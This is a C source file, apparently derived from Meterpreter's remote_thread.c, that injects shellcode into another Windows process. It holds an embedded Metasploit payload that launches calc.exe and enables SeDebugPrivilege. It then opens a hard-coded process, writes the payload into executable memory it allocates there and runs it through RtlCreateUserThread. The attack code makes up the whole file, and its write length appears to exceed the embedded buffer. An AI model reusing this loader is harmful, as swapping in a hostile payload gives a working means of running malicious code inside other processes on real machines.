/*! @brief https://github.com/rapid7/meterpreter/blob/master/source/common/arch/win/remote_thread.c */
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "advapi32.lib")

typedef DWORD(WINAPI *prototype_RtlCreateUserThread)(
	HANDLE      ProcessHandle,
	PSECURITY_DESCRIPTOR  SecurityDescriptor,
	BOOL      CreateSuspended,
	ULONG     StackZeroBits,
	PULONG     StackReserved,
	PULONG     StackCommit,
	LPVOID     StartAddress,
	LPVOID     StartParameter,
	HANDLE      ThreadHandle,
	LPVOID     ClientID
);

// windows/x64/exec CMD=calc
unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
"\x63\x00";


VOID EnableSeDebug()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;

	// Get a token for this process. 

	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))return;

	// Get the LUID for the Impersonate privilege. 
	int res = LookupPrivilegeValue(NULL, SE_DEBUG_NAME,
		&tkp.Privileges[0].Luid);

	tkp.PrivilegeCount = 1;  // one privilege to set    
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Get the impersonate priv for this process. 
	res = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
	printf("Completed!\n");
}

VOID Elevate()
{
	EnableSeDebug();
	HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1584);
	if (!proc) { printf("failed to open proc!\n"); return; };

	LPVOID lpBuf = VirtualAllocEx(proc, 0, 460 + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!WriteProcessMemory(proc, lpBuf, buf, 460, 0))
	{
		printf("Failed!\n");
		return;
	}

	prototype_RtlCreateUserThread pfnRtlCreateUserThread = NULL;

	
	pfnRtlCreateUserThread = (prototype_RtlCreateUserThread)GetProcAddress(GetModuleHandleA("ntdll"), "RtlCreateUserThread");


	HANDLE threadId = NULL;

	pfnRtlCreateUserThread(proc, NULL, 0, 0, 0, 0, lpBuf, 0, &threadId, NULL); 
	
	printf("WORKED!\n");

	return;
}

int main()
{
	Elevate();
	return 0;
}
